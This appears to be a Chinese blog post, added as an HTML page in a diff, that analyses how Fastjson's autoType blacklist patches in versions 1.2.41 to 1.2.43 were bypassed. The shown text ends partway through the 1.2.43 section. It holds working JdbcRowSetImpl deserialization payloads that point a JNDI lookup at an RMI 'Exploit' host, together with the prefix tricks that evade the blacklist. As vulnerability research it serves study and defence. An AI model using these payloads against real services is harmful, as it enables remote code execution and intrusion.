@@ -1,0 +1,1949 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="BlBana">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="BlBana">
+    
+    <meta name="keywords" content="hexo,BlBana,香蕉">
+    
+    <meta name="description" content="Web安全 | 代码审计 | PHP | Python ...">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Fastjson历史补丁Bypass分析 · BlBana&#39;s BlackHouse</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"大兄弟?别瞎搜啊，你看你搜的是个啥--> ${query}","hits_stats":"${hits} results found in ${time} ms, 这速度老板你看得劲不:)"}')
+
+            var algolia = {
+                applicationID: 'E622EWD38Z',
+                apiKey: '533878226d50d14c545c8e95a3379de2',
+                indexName: 'Blog comment',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <!-- <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-162189802-1', 'auto');
+        ga('send', 'pageview');
+    </script> -->
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-162189802-1"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-162189802-1');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >BlBana&#39;s BlackHouse.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Fastjson历史补丁Bypass分析</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>BlBana's BlackHouse.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Fastjson历史补丁Bypass分析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Fastjson反序列化">Fastjson反序列化</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "JavaSec">JavaSec</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.6k</span>阅读时长: <span class="post-count reading-time">19 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/04/16</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>本篇是开坑系列第五篇，在Fastjson 1.2.24版本之后，加入了checkAutoType()函数的校验，主要利用黑白名单对要反序列化的类进行校验，以下的Bypass都是基于黑名单的绕过情况（autoTypeSupport=true）。从已有的分析资料来看，主要几个绕过的点分别在1.2.41，1.2.42，1.2.43，1.2.45，1.2.47，1.2.62，1.2.66，1.2.68这几个版本</p>
+</blockquote>
+<a id="more"></a>
+<hr>
+<h1 id="Fastjson历史补丁Bypass分析"><a href="#Fastjson历史补丁Bypass分析" class="headerlink" title="Fastjson历史补丁Bypass分析"></a>Fastjson历史补丁Bypass分析</h1><h1 id="漏洞限制"><a href="#漏洞限制" class="headerlink" title="漏洞限制"></a>漏洞限制</h1><blockquote>
+<p>JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191</p>
+</blockquote>
+<p>本文测试全部使用的是：<code>1.6.0_65</code>部分payload测试使用<code>1.8.0_161</code></p>
+<h1 id="补丁Bypass"><a href="#补丁Bypass" class="headerlink" title="补丁Bypass"></a>补丁Bypass</h1><p>Fastjson补丁Bypass的情况主要分为以下两种情况:</p>
+<ul>
+<li>黑名单检测机制被绕过，导致同一条利用链重复利用；</li>
+<li>黑名单被绕过，发现新的Gadget链；</li>
+</ul>
+<h1 id="版本1-2-25"><a href="#版本1-2-25" class="headerlink" title="版本1.2.25"></a>版本1.2.25</h1><p>Fastjson从此版本开始引入了checkAutoType()函数，利用黑白名单对要反序列化的类进行校验，下面是具体的补丁信息。</p>
+<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><ul>
+<li><a href="https://github.com/alibaba/fastjson/commit/90af6aadfa9be7592fdc8e174458ddaebb2b19c4" target="_blank" rel="noopener">补丁commit</a></li>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.25" target="_blank" rel="noopener">1.2.25</a></li>
+</ul>
+<hr>
+<h1 id="版本1-2-41"><a href="#版本1-2-41" class="headerlink" title="版本1.2.41"></a>版本1.2.41</h1><h2 id="绕过原因"><a href="#绕过原因" class="headerlink" title="绕过原因"></a>绕过原因</h2><p>这里使用的还是<code>com.sun.rowset.JdbcRowSetImpl</code> 的利用链，先尝试运行之前的PoC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false&#125;"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命中黑名单</span></span><br><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">	at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:<span class="number">907</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:<span class="number">308</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="number">1335</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="number">1301</span>)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="number">152</span>)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="number">162</span>)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="number">131</span>)</span><br><span class="line">	at cc.blbana.vul.fastjson.FJPoC.main(FJPoC.java from InputFileObject:<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
+<p>修改PoC内容，成功触发，执行命令，关键部分为：<strong>Lcom.sun.rowset.JdbcRowSetImpl;</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false&#125;"</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/0.png" alt="Fastjson%20Bypass/Untitled.png"></p>
+<h2 id="详情分析"><a href="#详情分析" class="headerlink" title="详情分析"></a>详情分析</h2><p>直接跟进到checkAutoType()方法中，黑名单中使用<code>classname.startsWith(deny)</code>判断是否为恶意类，可以看到加了<code>L</code>后绕过了检测。</p>
+<p>问题来了：加了 <strong>L和; </strong>的类是否能成功获取到Class对象，继续跟进一下</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/1.png" alt="Fastjson%20Bypass/Untitled%201.png"></p>
+<p>在黑白名单都未找到对应Class对象时，会进入到<code>TypeUtils.loadClass</code> 方法中，自动去掉前后两个符号并返回去Class对象</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/2.png" alt="Fastjson%20Bypass/Untitled%202.png"></p>
+<h2 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h2><p>到了1.2.42，对以上这种绕过方式进行了修复，具体commit如下：</p>
+<ul>
+<li><a href="https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf" target="_blank" rel="noopener">补丁commit</a></li>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.42" target="_blank" rel="noopener">1.2.42</a></li>
+</ul>
+<h2 id="修复思路"><a href="#修复思路" class="headerlink" title="修复思路"></a>修复思路</h2><ul>
+<li>修改之前明文方式的<code>denyList</code>为<code>denyHashCodes</code>，防止研究人员根据包名找到新的利用链；</li>
+<li>将<code>Lcom.sun.rowset.JdbcRowSetImpl;</code> 前后符号去掉并处理为<code>hashCode</code>加入黑名单</li>
+</ul>
+<hr>
+<h1 id="版本1-2-42"><a href="#版本1-2-42" class="headerlink" title="版本1.2.42"></a>版本1.2.42</h1><h2 id="绕过原因-1"><a href="#绕过原因-1" class="headerlink" title="绕过原因"></a>绕过原因</h2><blockquote>
+<p>从1.2.42开始使用denyHashCodes的方式进行黑白名单检测</p>
+</blockquote>
+<p>先给出PoC，关键部分为：<strong>LLcom.sun.rowset.JdbcRowSetImpl;;</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false&#125;"</span></span><br></pre></td></tr></table></figure>
+<h2 id="详情分析-1"><a href="#详情分析-1" class="headerlink" title="详情分析"></a>详情分析</h2><p>刚刚提到了为了提高攻击门槛，Fastjson将黑名单转成了哈希的形式，避免被直接利用。</p>
+<p>但是由于修复过程中只考虑到了<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>情况，并对其中的类名进行了一次提取，并将提取后的结果取<code>hashCode</code>进行判断，导致<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>或者前后加更多的<code>L和;</code>也能进行绕过，具体原因下面分析：</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/3.png" alt="Fastjson%20Bypass/Untitled%203.png"></p>
+<blockquote>
+<p>可以看到上图是1.2.42中的两次不同判断方式，可能再第一次直接使用明文后，考虑到会被直接想到使用加符号的形式绕过低版本，也同样改成了使用hashCode的形式进行判断。</p>
+</blockquote>
+<p>利用<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>的hashCode绕过了黑名单，接下来利用<code>typeName</code>获取Class对象，可以看到<code>typeName</code>为<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>，为什么还是能执行 ？</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/4.png" alt="Fastjson%20Bypass/Untitled%204.png"></p>
+<p>由于Fastjson在提取类名上的一些特性，当检测到开头为<code>L</code>结尾为<code>;</code>时，就会一直循环提取<code>L和;</code>之间的内容，直到提取到真正的类名。</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/5.png" alt="Fastjson%20Bypass/Untitled%205.png"></p>
+<h2 id="补丁-2"><a href="#补丁-2" class="headerlink" title="补丁"></a>补丁</h2><ul>
+<li><a href="https://github.com/alibaba/fastjson/commit/f92e43095031935a2f8086f2de8831f45c3a34e5" target="_blank" rel="noopener">补丁commit</a></li>
+<li><a href="https://github.com/alibaba/fastjson/tree/1.2.43" target="_blank" rel="noopener">1.2.43</a></li>
+</ul>
+<h2 id="修复思路-1"><a href="#修复思路-1" class="headerlink" title="修复思路"></a>修复思路</h2><p>由于使用上面的方式绕过，类名前面会出现至少两个<code>L</code>，因此在判断了开头为<code>L</code>，结尾为<code>;</code>时，会再判断第二个字符是否为<code>L</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在比较hashCode的时候看到了一些小细节，本来只需要对每个类名计算一次hash并进行黑白名单对比即可，但在下面代码可以看到，会从第4个字符开始分别与hash值做异或，再进行判断，也是为了提高一些攻击门槛把，但最后还是被对比了出来，真的是世上本没有漏洞，自从有了安全研究后，漏洞就层出不穷，哈哈 …</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">    hash ^= (<span class="keyword">long</span>)className.charAt(i);</span><br><span class="line">    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">    <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="版本1-2-43"><a href="#版本1-2-43" class="headerlink" title="版本1.2.43"></a>版本1.2.43</h1><h2 id="绕过原因-2"><a href="#绕过原因-2" class="headerlink" title="绕过原因"></a>绕过原因</h2><p>直接放出payload，运行即可绕过黑名单执行命令，关键部分为：<strong>[com.sun.rowset.JdbcRowSetImpl</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,&#123; \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false&#125;"</span></span><br></pre></td></tr></table></figure>
+<p>可以看到在核心部分后还有<code>[{</code> 两个字符，尝试先传入没有这两个字符的<code>payload</code>，出现错误</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 异常显示在第42个字符位置，期望传入的是一个"["，但是现在是一个逗号","</span></span><br><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: exepct <span class="string">'['</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>, <span class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">false</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>根据上述报错信息调整payload，再次发送，依然报错</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":false&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 异常显示在第44个字符位置，期望传入的是一个"&#123;"</span></span><br><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="number">44</span>, fastjson-version <span class="number">1.2</span>.43</span><br></pre></td></tr></table></figure>
+<p>再次调整payload，在逗号后面加入字符<code>&quot;{&quot;</code>，成功触发</p>
+<blockquote>
+<p>这里发现和”{“写在逗号前后都可以触发payload，下面会仔细跟进一下这块是什么情况</p>
+</blockquote>
+<h2 id="详情分析-2"><a href="#详情分析-2" class="headerlink" title="详情分析"></a>详情分析</h2><p>由于开头使用了<code>&quot;[&quot;</code>字符，这个版本的修改也只是判断了下开头是否为<code>LL</code> ，这中写法由于黑名单中没有，自然绕过了hashCode的检测，当开头为<code>&quot;[&quot;</code>，会提取类名，并将获取到的Class对象放入到数组中，在这里是没有出现异常的并且Class已经正常获取到，可以继续向下跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TypeUtils.loadClass方法中</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>thisObj = deserializer.deserialze(this, clazz, fieldName);</code> 紧接着进入正常的反序列化流程，使用<code>ObjectArrayCodec</code>类型的反序列化器进行反序列化，其中会提取数组中的成员类型并使用<code>parser.parseArray</code> 进行解析</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/6.png" alt="Fastjson%20Bypass/Untitled%206.png"></p>
+<p>当前token不为14时，即会判断是否为<code>&quot;[&quot;</code> ，如果不是会抛出异常；</p>
